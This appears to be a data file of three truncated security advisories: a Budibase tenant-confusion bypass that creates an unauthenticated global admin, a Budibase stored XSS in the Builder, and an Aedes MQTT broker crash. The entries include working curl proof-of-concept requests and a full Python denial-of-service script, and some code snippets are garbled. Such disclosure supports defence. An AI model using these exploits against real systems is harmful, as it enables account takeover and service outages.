items.title: [@budibase/server] Budibase: Unauthenticated global-admin & database creation via tenant-confusion bypass of the one-time init guard (`POST /api/global/users/init`)
items.summary: DescriptionSummaryOn a self-hosted, single-tenant Budibase instance (multiTenancy:false), the public bootstrap endpoint POST /api/global/users/init remains fully exploitable after the instance has been provisioned. Its "already initialised" guard (checkAnyUserExists()) is evaluated inside a tenant-scoped database context derived from an attacker-controlled tenantId in the request body. Because the tenancy layer never constrains that tenantId to the only legitimate tenant (default) on a single-tenant deployment, an unauthenticated attacker simply supplies any unused tenant name to make the guard see an empty user list, and the endpoint then creates a brand-new CouchDB database (<tenantId>_global-db) and a global-admin user document (admin.global = true, builder.global = true) inside it - with no authentication and no CSRF token.This is (a) a bypass of the security control meant to permanently close first-run setup, and (b) an unauthenticated, persistent write primitive that lets an anonymous attacker create an unbounded number of databases and admin-user documents - a resource-exhaustion / denial-of-service vector against the CouchDB datastore, plus creation of latent rogue admin accounts.DetailsRoot cause chain (source, tag v3.44.0):packages/worker/src/api/index.ts:41 - POST /api/global/users/init is in PUBLIC_ENDPOINTS, so auth.buildAuthMiddleware(PUBLIC_ENDPOINTS) marks it publicEndpoint and the "no public access to worker" gate (api/index.ts:159-165) lets it through without any session. It is also in NO_TENANCY_ENDPOINTS (api/index.ts:83), so the tenancy middleware does not pin the request to default - the tenant is taken verbatim from the request body - and in NO_CSRF_ENDPOINTS.packages/worker/src/middleware/cloudRestricted.ts:10,25 - the cloudRestricted guard only enforces the internal API key when !env.SELF_HOSTED && !env.DISABLE_ACCOUNT_PORTAL. On a self-hosted instance (SELF_HOSTED=true) it is a no-op (return next()), so cloudRestrictedRoutes provides no protection here.packages/worker/src/api/routes/global/users.ts:69-79 - cloudRestrictedRoutes.post("/api/global/users/init", … controller.adminUser).packages/worker/src/api/controllers/global/users.ts:232 - the handler runs await tenancy.doInTenant(tenantId, …) using the attacker-supplied tenantId.packages/worker/src/api/controllers/global/users.ts:238 - the only guard, const userExists = await checkAnyUserExists(), throws 403 only if a user exists in the current tenant context.packages/worker/src/utilities/users.ts:3-15 - checkAnyUserExists() calls tenancy.getGlobalDB(), which resolves to <tenantId>_global-db. For any unused tenantId this DB is empty → the guard passes → userSdk.db.createAdminUser(email, tenantId, …) (users.ts:247) creates a full global admin.The defect is incorrect authorization scoping: the single-tenant deployment invariant ("only tenant default exists; init is one-time") is never enforced against the request-supplied tenantId, so the guard is evaluated against a namespace the attacker chooses.Configuration confirmed via GET /api/system/environment → {"multiTenancy":false,"cloud":false,"disableAccountPortal":false,"isDev":false}.PoCTarget http://127.0.0.1:3014 (Budibase v3.44.0-cloud.2). No credentials, no cookies, no CSRF token. All values real, captured live on 2026-09-02; nothing redacted.Step 1 - BASELINE: the guard correctly blocks re-init of the real tenant (default)curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \  -H 'Content-Type: application/json' \  -d '{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}'Burp - RequestPOST /api/global/users/init HTTP/1.1Host: 127.0.0.1:3014Content-Type: application/jsonContent-Length: 82{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}Burp - ResponseHTTP/1.1 403 ForbiddenContent-Type: application/json; charset=utf-8{"message":"You cannot initialise once an global user has been created.","status":403}Step 2 - PAYLOAD: supply any unused tenantId → the guard is bypassed and a global admin is created, fully unauthenticatedcurl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \  -H 'Content-Type: application/json' \  -d '{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}'Burp - RequestPOST /api/global/users/init HTTP/1.1Host: 127.0.0.1:3014Content-Type: application/jsonContent-Length: 78{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}Burp - ResponseHTTP/1.1 200 OKContent-Type: application/json; charset=utf-8{"_id":"us_d0c2b6c9014a43e2899a2770d2e6280c","_rev":"1-554ff75f0064fb15f92e341faad7263b","email":"pwn-f7poc@evil.test"}The single differential - tenantId:"default" → 403, tenantId:"f7poc" → 200 with a persisted us_… id - is the whole bug: the one-time-setup guard is scoped to a namespace the attacker chooses.Step 3 - the write persisted: re-init of the same tenant now hits the (per-tenant) guardcurl -s -i -X POST 'http://127.0.0.1:3014/api/glob

items.title: [@budibase/server] Budibase: Cross-privilege Stored XSS in the Budibase Builder via broken HTML-escaping in `jsonFormatter.format()` rendered through `{@html}` in the CSP-less Builder origin
items.summary: DescriptionSummaryA low-privileged application end-user (role BASIC - not a builder or admin, and on a public data-collection form, an unauthenticated visitor) can store an HTML/JavaScript payload in ordinary row data. When a builder or admin later opens that table in the Budibase Builder and evaluates any Handlebars binding whose Preview surfaces the value (the Data-section Formula column editor, or any binding drawer), the stored value is rendered as raw HTML and the attacker's JavaScript executes in the Builder's origin.The Builder SPA is served by nginx with no Content-Security-Policy (the CSP middleware only decorates the server-rendered published-app document, not /builder/). The injected script therefore runs unrestricted in the highest-trust surface of the product - the admin/builder session that can create datasources, run server-side JavaScript via automations, read and modify every table, and manage users. This is a cross-privilege stored XSS (app end-user → builder/admin), i.e. full workspace takeover, not self-XSS.DetailsRoot cause 1 - the escaper is a no-op.packages/frontend-core/src/utils/jsonFormatter.ts (format()):jsonString = jsonString .replace(/&/g, "&") // no-op: replaces "&" with "&" (should be "&") .replace(//g, ">") // no-op (should be ">")return jsonString.replace( /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+...)/g, (match) => { if (/^"/.test(match)) { if (/:$/.test(match)) { color = colors.keyColor } // KEY: NOT escaped else { match = '"' + escapeHtml(match.substr(1, match.length - 2)) + '"' } // string VALUE: escaped } return `${match}` })Only quoted JSON string values are passed through escapeHtml. Everything else is emitted verbatim, because the leading .replace(/&/g,"&")… chain replaces each character with itself. Two consequences:A raw, non-JSON string (the normal result of a Handlebars binding that resolves to a plain text field value) matches none of the regex tokens and is returned completely un-escaped.Object keys are never escaped.Root cause 2 - the output is injected with {@html}.packages/builder/src/components/common/bindings/EvaluationSidePanel.svelte:line 116: {@html logLine.log}line 128: {@html highlightedResult}highlightedResult is the output of JsonFormatter.format(), so the un-escaped attacker string is inserted into the DOM as live markup.Root cause 3 - binding output is not entity-escaped upstream.Every {{ … }} statement is wrapped by the ALL helper in packages/string-templates/src/helpers/index.ts, which returns a Handlebars.SafeString; Handlebars therefore performs no HTML escaping, and the raw field value reaches the formatter/{@html} sink.Root cause 4 - no CSP on the Builder.GET /builder/* is served as a static SPA by nginx with no Content-Security-Policy header (verified live below). The contentSecurityPolicy middleware (packages/backend-core/src/middleware/contentSecurityPolicy.ts) only sets a nonce-based CSP on the server-rendered published-app document (serveApp). So in the Builder origin there is no script-src restriction and inline event handlers run freely.Cross-privilege data channel.Internal-table dev/prod data live in separate databases, but external datasources are queried live and shared between the published app (where low-priv users write) and the Builder's dev preview (where the value is rendered). A BASIC app user writing to an external SQL table that a data-collection app exposes for writes therefore lands the payload directly in the Builder's evaluation context. RowUtils.generateGoldenSample() even prefers the longest string per column, guaranteeing a long payload is the sample the Preview evaluates.Payload shape note. jsonFormatter.format() tokenises quoted strings, digits and true/false/null into s, which would fragment a handler containing them. A payload free of double-quotes, digits and those literals - e.g. - survives verbatim and executes.PoCEnvironment used for this reproduction (all values real / unredacted):ItemValueTargethttp://127.0.0.1:3014 (self-host single image, Budibase v3.44.0, commit d1ed6085)Dev app idapp_dev_cc322a9cd27a492eb934f43b146c6e81Prod app idapp_cc322a9cd27a492eb934f43b146c6e81External Postgres tabledatasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tblAttacker (low-priv BASIC)lowuser@budibase.local / LowUser!2026#bbVictim (builder/admin)admin@budibase.local / LabAdmin!2026#bbStep 0 - (precondition, performed once by the builder) a data-collection app grants BASIC write on the table# grant the low user BASIC role on the appcurl -s -b creds/admin.cookies -H "Content-Type: application/json" -X POST \ http://127.0.0.1:3014/api/global/users \ -d '{"_id":"us_df036f58299242608f665700b1618057","_rev":"1-f24520b49fae0a6f4a23dced7a82fcc8"

items.title: [aedes] Aedes has Uncaught Exception and Uncontrolled Resource Consumption
items.summary: SummaryA remote Denial of Service (DoS) vulnerability, allows any remote client to cause a complete crash of the Aedes MQTT broker process. This is achieved by sending a specially crafted MQTT message (via PUBLISH or SUBSCRIBE), or by setting a Will message with such a topic, containing a highly recursive topic string (e.g., with thousands of '/' delimiters). The lack of input validation and error handling leads to an uncaught exception in an internal routing library, terminating the entire Node.js application.DetailsThe Aedes broker fails to enforce limits on the depth or structural complexity of MQTT topic strings. When a client publishes to or subscribes to a topic with excessive levels of recursion, the internal routing logic cascading into the qlobber library (via mqemitter) reaches an hard-coded limit within the qlobber._split_words function.This function throws a hard Error: too many words (found in lib/qlobber.js:604). Crucially, Aedes does not wrap the calls to these internal modules (such as in handlers/subscribe.js or the publishing logic) in try-catch blocks. Consequently, this exception propagates up to the main Node.js event loop as an unhandled exception, causing the entire broker process to crash immediately.This vulnerability affects all stable versions of Aedes due to the underlying dependency behavior and missing perimetral validation.Stack Trace from Crash:aedes-broker  | /app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:604aedes-broker  | throw new Error('too many words');aedes-broker  | ^aedes-broker  | aedes-broker  | Error: too many wordsaedes-broker  |     at Qlobber._split_words (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:604:15)aedes-broker  |     at Qlobber._split (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:624:18)aedes-broker  |     at Qlobber.add (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:651:43)aedes-broker  |     at MQEmitter.on (/app/node_modules/mqemitter/mqemitter.js:65:17)aedes-broker  |     at Aedes.subscribe (/app/node_modules/aedes/aedes.js:289:11)aedes-broker  |     at SubState.addSubs (/app/node_modules/aedes/lib/handlers/subscribe.js:167:12)The same uncaught exception can be triggered without an explicit PUBLISH/SUBSCRIBE: a client that registers a Will message with a deeply nested topic crashes the broker when the Will is published on ungraceful disconnect, because the Will publish path calls broker.publish directly and bypasses the PUBLISH handler.PoCPrerequisitesAedes MQTT Broker running and accessible over the network. For testing and replication, the broker was deployed using the official Docker image via the following command:docker run -d --name aedes-broker -p 1883:1883 moscajs/aedes:latestAbility to establish an MQTT session (authenticated or unauthenticated, as per the broker's configuration).Reproduction StepsSave the following Python stress testing script (mqtt_crash_poc.py):#!/usr/bin/env python3import argparseimport timeimport paho.mqtt.client as mqttdef on_connect(client, userdata, flags, reason_code, properties=None):    if reason_code != 0:        print(f"[-] Error en la conexión: {reason_code}")def on_disconnect(client, userdata, disconnect_flags, reason_code, properties=None):    if reason_code != 0:        print(f"[*] -> Desconexión detectada (Caída del bróker). Razón: {reason_code}")def run_exploit(host, port):    # Escenarios de colapso directo (Casos 1.2, 1.3, 2.2, 2.3)    payloads = [            {"type": "PUB_DEEP", "topic": "a/" * 30000 + "target"},            {"type": "PUB_LIMIT", "topic": "a/" * 32766 + "a/b"},            {"type": "SUB_WILD", "topic": "+/" * 150 + "#", "pub": "A/" * 150 + "target"},            {"type": "SUB_DEEP", "topic": "+/" * 10000 + "#", "pub": "A/" * 10000 + "target"}    ]            for case in payloads:        print(f"\n[*] Lanzando vector de ataque tipo: {case['type']}")        client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)        client.on_connect = on_connect        client.on_disconnect = on_disconnect                    try:            client.connect(host, port, keepalive=60)            client.loop_start()            time.sleep(1)                            if "PUB" in case['type']:                client.publish(case['topic'], payload="DoS_Attack", qos=0)            else:                client.subscribe(case['topic'], qos=0)                time.sleep(1)                client.publish(case['pub'], payload="DoS_Attack", qos=0)                                time.sleep(2)        except Exception as e:            print(f"[-] Error durante el envío: {e}")        finally:            client.loop_stop()            client.disconnect()if __name__ == "__main__":    parser = argparse.ArgumentParser()    parser.add_argument("-d", "--direccion", required=True, help="IP del broker")    parser.add_argument("-p", "--puerto", type=int, default=1883, help="Puerto")    args = parser.parse_args()    run_exploit(args.direccion,
